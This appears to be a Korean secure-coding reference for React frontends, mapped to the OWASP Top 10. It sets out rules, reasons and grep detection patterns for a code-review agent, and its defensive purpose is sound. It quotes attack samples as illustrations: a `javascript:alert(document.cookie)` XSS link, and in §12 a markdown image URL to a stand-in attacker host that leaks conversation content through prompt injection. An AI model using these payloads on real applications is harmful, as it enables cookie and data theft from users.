---
description: "React 웹 프론트엔드 보안 가이드 SSOT — 규칙·근거·리뷰 탐지 시그널"
scope: react-web
---

# Web Security Guide (React Web)

> **적용 대상:** React 웹 프론트엔드 (react-web preset 프로젝트). 다른 스택 프로젝트에서는 참고용.
> **심각도 분류:** `.claude/refs/code-review.md` §8을 따른다.
> **역할 경계:** 이 문서는 보안 지식(규칙·왜·탐지 시그널)의 SSOT다. 리뷰 절차·리포트 형식은 `code-review.md`, 프로젝트별 실행 규약 요약은 `.claude/rules/project-convention.md`(Security)가 소유한다.

참고: [certificates.dev – Security in React Applications](https://certificates.dev/blog/security-in-react-applications), [OWASP Top 10:2025](https://owasp.org/Top10/2025/), [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

## 0. 원칙: 클라이언트는 신뢰 경계 밖이다

- 브라우저에서 실행되는 모든 것 — 코드, 상태, 검증 로직, 라우트 가드 — 은 사용자가 열람·변조할 수 있다.
- 클라이언트 측 검증·권한 분기는 **UX 최적화**일 뿐이며, 보안 결정(인증·인가·입력 검증)은 항상 서버가 최종 판정한다.
- 상위 원칙: `.claude/refs/engineering-principles.md` [Security] — Least Privilege, Defense in Depth, Never Trust the Client.

### 0.1 신뢰 경계부터 그린다

규칙을 개별로 대조하기 전에, 대상 기능의 **신뢰할 수 없는 입력원 → 위험한 싱크** 경로를 먼저 적는다. 아래 절들은 이 경로 위에서만 의미가 있다.

- **입력원(source):** URL·쿼리·해시, 폼 입력, 서버 응답 속 사용자 생성 콘텐츠(CMS·댓글), `postMessage`, 서드파티 스크립트·iframe, 사용자가 올린 파일(§11), LLM 출력(§12)
- **싱크(sink):** HTML 렌더(§1.2), URL 속성(§1.3), DOM 직접 조작·동적 코드(§1.4), 스토리지(§2), 네트워크 요청(§3·§12), 외부로 나가는 분석·로그(§7)
- **경계에서 묻는 것:** 이 입력은 어디서 검증되는가(서버인가), 어느 싱크에 닿는가, 그 싱크의 방어 장치는 무엇인가

### OWASP Top 10:2025 ↔ 본 문서 매핑

| OWASP Top 10:2025 | 본 문서 |
|---|---|
| A01 Broken Access Control | §3(CSRF), §5(신뢰 경계·접근 제어), §8(iframe), §12(LLM 도구 호출 권한) |
| A02 Security Misconfiguration | §4(CSP·보안 헤더), §8(postMessage) |
| A03 Software Supply Chain Failures | §6(의존성·공급망) |
| A04 Cryptographic Failures | §2(토큰 저장), §7(민감정보 노출) |
| A05 Injection | §1(XSS), §5(파라미터화 쿼리), §11(업로드 파일 렌더), §12(LLM 출력 렌더) |
| A06 Insecure Design | §0.1(신뢰 경계 매핑), §5(신뢰 경계), §11(업로드) |
| A07 Authentication Failures | §2(토큰·세션 저장) |
| A08 Software or Data Integrity Failures | §6(lockfile·스크립트) |
| A09 Security Logging and Alerting Failures | §7(민감값 로깅) |
| A10 Mishandling of Exceptional Conditions | §9(에러·예외 처리) |

LLM 기능이 있으면 [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/)도 함께 본다 — 프론트엔드 관점 매핑은 §12.

---

## 1. XSS — React 이스케이프의 경계 [A05]

### 1.1 자동 이스케이프가 막는 것 / 못 막는 것

- **규칙:** JSX 텍스트 삽입(`{userInput}`)은 React가 자동 이스케이프하므로 안전하다. 단, 아래 3가지 우회 경로는 자동 보호 대상이 아니다 — ① `dangerouslySetInnerHTML`, ② URL을 받는 속성(`href`/`src` 등), ③ React 밖의 DOM 직접 조작.
- **왜:** React의 이스케이프는 "텍스트 노드/속성 값" 컨텍스트에만 작동한다. HTML 파서·URL 파서·JS 실행 컨텍스트로 흘러가는 값은 별도 방어가 필요하다.

### 1.2 dangerouslySetInnerHTML

- **규칙:** `dangerouslySetInnerHTML`은 sanitize(DOMPurify 등) 없이 사용 금지. 가능하면 사용 자체를 회피한다 — Markdown은 HTML 문자열이 아니라 React 엘리먼트로 변환해 렌더한다.
- **왜:** `innerHTML`을 직접 설정하므로 `<img onerror=...>` 같은 이벤트 핸들러·스크립트가 그대로 실행된다. CMS·사용자 생성 콘텐츠가 흔한 유입 경로다.

```javascript
// ❌ 미검증 HTML 직접 렌더
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ✅ sanitize 후 렌더
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```

### 1.3 URL 인젝션 — href/src

- **규칙:** 사용자 입력이 `href`/`src`/`action`/`formAction`/`window.open` 인자로 흐르면 URL 스킴을 화이트리스트(`http:`/`https:`/상대경로)로 검증한다. `javascript:`/`data:` 스킴 차단.
- **왜:** `<a href="javascript:alert(document.cookie)">`는 React 이스케이프를 우회하는 실행 벡터다. React 19+가 `javascript:` URL에 경고를 내지만 차단을 보장하지 않는다.

### 1.4 DOM API 직접 조작·동적 코드 실행

- **규칙:** `ref.current.innerHTML`/`outerHTML` 대입, `document.write(ln)`, `insertAdjacentHTML`, `eval`, `new Function`, 문자열 인자 `setTimeout`/`setInterval` 금지. 텍스트 삽입은 `textContent`/`setAttribute`(하드코딩된 안전 속성) 같은 safe sink를 쓴다.
- **왜:** React 밖에서 DOM을 직접 조작하면 프레임워크 이스케이프가 전혀 개입하지 못한다 (DOM based XSS).

**리뷰 시그널 (§1):** 부록 A의 XSS 행 참조.

---

## 2. 토큰·세션 저장 [A07/A04]

- **규칙:** 액세스/리프레시 토큰·세션 식별자를 `localStorage`/`sessionStorage`/일반 쿠키(비 HttpOnly)/IndexedDB에 저장 금지. 서버가 `HttpOnly; Secure; SameSite=Lax|Strict` 쿠키로 발급한다.
- **규칙:** 부득이 메모리 보관 시(SPA 인메모리 액세스 토큰) 새로고침 복원은 refresh 쿠키로 처리하고, webStorage로의 "임시 백업"을 만들지 않는다.
- **왜:** webStorage·IndexedDB는 페이지의 모든 JS가 읽을 수 있다 — XSS 1건이면 토큰 전량 탈취로 직결된다. HttpOnly 쿠키는 JS 접근 자체가 차단되어 이 벡터를 제거한다.

---

## 3. CSRF [A01 연계]

- **규칙:** 쿠키 기반 인증이면 CSRF 방어가 필수다 — `SameSite=Lax|Strict` 쿠키 속성 + 상태 변경 요청에 CSRF 토큰(Synchronizer Token 또는 Signed Double-Submit) 또는 커스텀 헤더(`X-CSRF-Token` 등) 검증.
- **규칙:** 상태 변경(mutation)에 GET 사용 금지. `fetch`의 `credentials: 'include'`를 전역 기본값으로 두지 않는다.
- **왜:** 브라우저는 교차 사이트 요청에도 쿠키를 자동 첨부한다. SameSite만으로는 구형 브라우저·서브도메인 우회·`SameSite=None` 요구 시나리오를 못 막으므로 토큰/헤더 방어를 겹친다 (Defense in Depth). 커스텀 헤더 방식은 CORS preflight를 강제해 단순 요청 위조를 차단한다.

---

## 4. CSP·보안 헤더 [A02]

- **규칙:** nonce(또는 hash) 기반 strict CSP를 기본값으로 한다. `unsafe-inline`/`unsafe-eval` 금지, 도메인 화이트리스트 방식보다 `strict-dynamic` 우선.

```
Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

- **규칙:** 프레이밍 차단은 `frame-ancestors 'none'`(또는 `'self'`)으로 선언한다 — 레거시 브라우저 대비 `X-Frame-Options: DENY` 병행 가능(§8). `X-Content-Type-Options: nosniff` 적용.
- **왜:** CSP는 XSS가 뚫려도 스크립트 실행을 막는 마지막 방어층이다. 도메인 화이트리스트는 JSONP·오픈 리다이렉트로 우회되는 사례가 많아 nonce+`strict-dynamic`이 권장된다.

---

## 5. 클라이언트 신뢰 경계·접근 제어 [A01/A06]

- **규칙:** 클라이언트 RBAC·라우트 가드·폼 검증은 UX용이다. 모든 보호 자원은 서버/BFF가 요청마다 재검증한다 — 클라이언트에서 숨긴 버튼·라우트는 보호가 아니다.
- **규칙:** 사용자 입력을 처리하는 서버 진입점(API·Server Function)은 3단계를 지킨다: ① 인증·인가 확인 → ② 스키마 검증(zod 등, 허용 목록 방식) → ③ 파라미터화 쿼리(문자열 결합 금지).
- **규칙:** 인가 판단에 클라이언트가 보낸 식별자(userId, role 등)를 그대로 신뢰하지 않는다 — 세션에서 파생한 값만 사용한다 (IDOR 방지).
- **왜:** DevTools·프록시로 클라이언트 검증은 전부 우회 가능하다. OWASP Top 10:2025 1위(A01 Broken Access Control)의 전형이 "프론트에서만 막은 접근 제어"다.

---

## 6. 의존성·공급망 [A03/A08]

- **규칙:** lockfile(`package-lock.json`/`pnpm-lock.yaml`/`yarn.lock`) 커밋 필수. CI/배포는 `npm ci`(또는 `--frozen-lockfile`)로 lockfile을 강제한다.
- **규칙:** 설치 시 `--ignore-scripts` 기본 적용(`.npmrc`의 `ignore-scripts=true`). 신규 패키지는 설치 전 `npm info`로 출처·유지보수 상태를 확인한다 (typosquatting 주의).
- **규칙:** `npm/pnpm/yarn audit`를 정기 실행하고 Critical/High는 미해결 상태로 두지 않는다. `package.json`에 git URL/http 의존성 금지.
- **왜:** A03 Software Supply Chain Failures는 2025년 Top 10에 신규 진입했다. install script는 임의 코드 실행 벡터이고, lockfile 부재는 빌드마다 다른 코드를 가져온다.

---

## 7. 민감정보 노출 [A04/A09]

- **규칙:** 공개 prefix env(`VITE_`/`NEXT_PUBLIC_`/`REACT_APP_`)는 **번들에 포함되어 전부 공개**된다 — API 시크릿·서명 키 배치 금지. 서버 전용 시크릿은 prefix 없는 서버 env로만 관리한다.
- **규칙:** 프로덕션 소스맵은 공개 배포하지 않는다(에러 트래킹 서비스에만 업로드). API 키·토큰·자격증명 하드코딩 금지 — 프로젝트의 Sensitive Files 정책(`CLAUDE.md`)을 따른다.
- **규칙:** 토큰·비밀번호·개인정보를 `console.log`·에러 리포트·분석 이벤트에 남기지 않는다.
- **규칙 (개인정보 최소화):** 분석 이벤트·세션 리플레이·에러 트래킹으로 나가는 payload에 이메일·전화번호·주소·주민/결제 정보 같은 PII를 넣지 않는다 — 식별이 필요하면 서버가 발급한 비식별 ID를 쓴다. 세션 리플레이는 입력 필드 마스킹을 기본값으로 둔다. PII를 webStorage에 캐시하지 않고, 화면에 필요한 만큼만 받는다(서버 응답에 쓰지 않는 개인정보 필드가 실려 오면 API 쪽 과다 노출로 보고한다).
- **왜:** 프론트 번들은 정적 자산이다 — 난독화는 보호가 아니며, 번들에 들어간 시크릿은 유출된 것으로 간주한다. 서드파티 분석·리플레이 도구로 흘러간 PII는 회수할 수 없고, 수집 목적 밖 처리라 개인정보 규제 위반으로 이어진다.

---

## 8. postMessage·iframe·클릭재킹 [A02/A01]

- **규칙:** `postMessage` 송신 시 `targetOrigin`에 `'*'` 금지 — 대상 origin을 명시한다. 수신 핸들러(`message` 이벤트)는 `event.origin`을 허용 목록과 **완전 일치**로 검증하고, 수신 데이터를 신뢰 입력으로 취급하지 않는다(§1의 싱크로 직행 금지).
- **규칙:** 서드파티 콘텐츠 iframe에는 `sandbox` 속성을 적용한다. 자신이 프레이밍되는 것은 `frame-ancestors`(§4)로 차단한다.
- **왜:** origin 미검증 postMessage는 임의 사이트가 앱 내부 메시지 프로토콜을 호출할 수 있게 하고, 프레이밍 허용은 클릭재킹(UI redressing)으로 이어진다.

---

## 9. 에러·예외 처리 보안 [A10]

- **규칙:** 예외를 삼키지 않는다(빈 `catch` 금지 — fail-fast, No Implicit Fallback 원칙 연계). 인가·검증 실패 경로는 **fail-closed**(거부가 기본값)로 설계한다.
- **규칙:** 사용자에게 노출되는 에러 메시지에 스택 트레이스·내부 경로·쿼리·서버 구성 정보를 포함하지 않는다. 상세 원인은 서버 로그로만 남긴다.
- **규칙:** 렌더 트리에는 Error Boundary를 두어 예외가 앱 전체를 무너뜨리거나(가용성) 내부 상태를 노출하지 않게 한다.
- **왜:** A10 Mishandling of Exceptional Conditions — 예외 경로는 정상 경로보다 검증이 허술해 정보 노출·인가 우회(fail-open)가 자주 발생하는 지점이다.

---

## 10. 백엔드 보안 개요 (추후 확장)

> **경계 선언:** 본 문서는 프론트엔드와 그 인접 경계(BFF/API 접점, §5)까지 다룬다. 서버 전반의 상세 기준은 별도 ref(예: `backend-security.md`)로 확장 예정이다.

서버 측에서 최소한 점검할 항목의 요약 (OWASP Top 10:2025 서버 관점):

- **접근 제어(A01):** 모든 엔드포인트에 인증·인가 미들웨어, 객체 수준 권한(IDOR) 검증.
- **설정(A02):** CORS 허용 origin 최소화(`*` + credentials 금지), 기본 크리덴셜 제거, 불필요 포트·디버그 엔드포인트 비활성.
- **암호화(A04):** 전송 구간 TLS, 저장 시 비밀번호는 적응형 해시(bcrypt/argon2), 시크릿은 vault/env로 관리.
- **인젝션(A05):** 파라미터화 쿼리, ORM에서도 raw query 문자열 결합 금지, 명령어 인젝션·경로 탐색 방어.
- **인증(A07):** rate limiting·계정 잠금, 세션 고정 방지(로그인 시 세션 재발급), 안전한 토큰 만료·갱신.
- **로깅·경보(A09):** 인증 실패·권한 거부 이벤트 로깅, 민감값 마스킹, 이상 징후 경보 경로 확보.
- **SSRF:** 서버가 사용자 제공 URL로 요청을 보낼 때 허용 목록·내부망 차단.

---

## 11. 파일 업로드 [A05/A06]

- **규칙:** 클라이언트의 `accept` 속성·확장자·크기 검사는 UX용이다. 파일 타입(내용 기반 판별)·크기·개수 제한은 서버가 최종 판정한다.
- **규칙:** 업로드된 파일을 앱과 **같은 origin에서 인라인 렌더하지 않는다** — 특히 SVG·HTML은 스크립트를 품을 수 있다. 사용자 업로드는 별도 도메인(또는 `Content-Disposition: attachment`)으로 서빙하고, 미리보기는 `URL.createObjectURL`로 만든 blob을 `<img>`로만 띄운다(`<object>`/`<iframe>`/`innerHTML` 금지).
- **규칙:** 업로드 파일명은 텍스트로만 표시한다(§1 싱크 금지). 서버 저장 경로를 클라이언트가 보낸 파일명으로 조합하지 않는다(경로 탐색 — §10).
- **왜:** 업로드는 "사용자가 고른 바이트"가 앱 origin으로 들어오는 경로다. 같은 origin에서 렌더된 SVG/HTML은 저장형 XSS가 되고, 클라이언트 검증은 프록시로 그대로 우회된다.

---

## 12. AI/LLM 기능 [LLM01/02/05/06/10]

LLM 출력은 **신뢰할 수 없는 입력**이다 — 사용자 입력과 같은 등급으로 취급한다(프롬프트 인젝션으로 공격자가 출력을 조종할 수 있다).

- **규칙 (출력 렌더, LLM05):** 모델 응답을 HTML로 렌더할 때 §1.2 규칙을 그대로 적용한다 — Markdown은 sanitize를 거치거나 React 엘리먼트로 변환한다. 응답 속 링크는 §1.3 스킴 검증을 거친다.
- **규칙 (외부 리소스 자동 로드 차단, LLM01·02):** 모델 응답 속 이미지·외부 URL을 자동 로드하지 않거나 허용 도메인으로 제한한다.
- **규칙 (키·프롬프트 위치, LLM02·07):** LLM 공급자 API 키를 클라이언트 번들·공개 env(§7)에 두지 않는다 — 호출은 서버/BFF를 경유한다. 클라이언트에 있는 시스템 프롬프트는 공개된 것으로 간주하고, 비밀·권한 규칙을 그 안에 두지 않는다.
- **규칙 (도구 호출 권한, LLM06):** 모델이 트리거하는 동작(데이터 조회·변경·외부 전송)은 서버가 **현재 사용자 권한으로** 재검증한다. 파괴적·외부 전송 동작은 사용자 확인을 거친다. 모델 출력을 그대로 쿼리·명령·URL로 조합하지 않는다(§5·§10).
- **규칙 (데이터 전송, LLM02):** 프롬프트에 넣는 사용자 데이터·PII는 화면에 필요한 범위로 줄이고(§7), 어떤 데이터가 외부 모델로 나가는지 기능 명세에 적는다.
- **규칙 (비용·남용, LLM10):** 요청 빈도·입력 길이·토큰 상한은 서버에서 강제한다. 클라이언트 디바운스·글자 수 제한은 UX일 뿐이다.
- **왜:** 공격자가 웹페이지·문서·사용자 메시지에 심은 지시가 모델 출력을 바꾸므로, "우리 모델이 만든 값"이라는 이유로 출력을 신뢰하면 XSS·데이터 유출·권한 우회 경로가 된다. 특히 Markdown 이미지 자동 로드는 `![](https://attacker/?q=<대화 내용>)` 형태로 클릭 없이 데이터를 유출시키는 알려진 벡터다.

---

## 부록 A. 탐지 시그널 통합 표 (리뷰 에이전트용)

리뷰·보안 스캔 시 아래 패턴을 grep 후, 매치 지점의 실제 도달 가능성·완화 장치 유무를 코드 흐름으로 확인한다 (매치 = 이슈 확정이 아님).

| 섹션 | 탐지 시그널 (grep 패턴) | 확인할 것 |
|---|---|---|
| §1.2 XSS | `dangerouslySetInnerHTML` | `DOMPurify.sanitize`(또는 동급) 경유 여부 |
| §1.3 URL | `href={`, `src={`, `window.open(` 에 미검증 변수 | 스킴 화이트리스트 검증 존재 여부 |
| §1.4 DOM | `innerHTML\s*=`, `outerHTML\s*=`, `document.write`, `insertAdjacentHTML`, `eval\(`, `new Function\(`, `setTimeout\(["']`, `setInterval\(["']` | React 밖 DOM 조작·동적 코드 실행 여부 |
| §2 토큰 | `localStorage.setItem`, `sessionStorage.setItem` 인자에 `token|jwt|auth|session|credential` 계열 | 인증 관련 값의 webStorage 저장 여부 |
| §3 CSRF | `credentials:\s*['"]include`, 쿠키 인증 + CSRF 토큰 헤더 부재, mutation GET | 토큰/커스텀 헤더 검증 경로 존재 여부 |
| §4 CSP | CSP 설정 부재, `unsafe-inline`, `unsafe-eval` | strict CSP 선언 위치(서버 헤더/메타) |
| §5 경계 | 클라이언트 가드만 있고 대응 서버 인가 확인 불가, 요청 body의 `userId|role`로 인가 | 서버 재검증·세션 파생 값 사용 여부 |
| §6 공급망 | lockfile 부재/`.gitignore` 포함, `"(git\|http)[^"]*"` 형태 의존성, audit 미해결 Critical | lockfile 강제·스크립트 정책 |
| §7 노출 | `(VITE_|NEXT_PUBLIC_|REACT_APP_)\w*(KEY|SECRET|TOKEN|PASSWORD)`, `console.log`에 민감 변수, 프로덕션 `sourcemap` 설정 | 번들 포함 여부·마스킹 여부 |
| §8 메시징 | `postMessage(`+`'*'`, `addEventListener('message'` 핸들러에 `event.origin` 검증 부재 | origin 완전 일치 검증 |
| §9 예외 | 빈 `catch\s*(\(\w*\))?\s*{\s*}`, `err.stack|err.message` 렌더 출력 | fail-closed 여부·노출 범위 |
| §7 PII | 분석·리플레이·에러 트래킹 호출(`track(`, `identify(`, `captureException(` 등) 인자에 `email|phone|address|name` 계열 필드, 리플레이 SDK 마스킹 옵션 비활성 | 외부 전송 payload의 PII 포함 여부 |
| §11 업로드 | `type="file"`, `FormData` + `append(`, 업로드 URL을 `<object>`/`<iframe>`/`<embed>`/`innerHTML`로 렌더, `image/svg+xml` 허용 | 서버 측 타입·크기 검증 경로, 서빙 origin·인라인 렌더 여부 |
| §12 LLM | LLM SDK·엔드포인트 호출(`openai`, `anthropic`, `/chat`, `completions` 등) 응답의 `dangerouslySetInnerHTML`·Markdown 렌더, 응답 속 `<img>`/링크 자동 렌더, 공개 env에 `(OPENAI|ANTHROPIC|LLM|AI)\w*KEY` | 출력 sanitize·외부 리소스 차단·서버 경유 호출·도구 호출 서버 재인가 여부 |

---

## 부록 B. 참고 문헌

- [certificates.dev — Security in React Applications](https://certificates.dev/blog/security-in-react-applications)
- [OWASP Top 10:2025](https://owasp.org/Top10/2025/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [OWASP NPM Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html)
- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/)
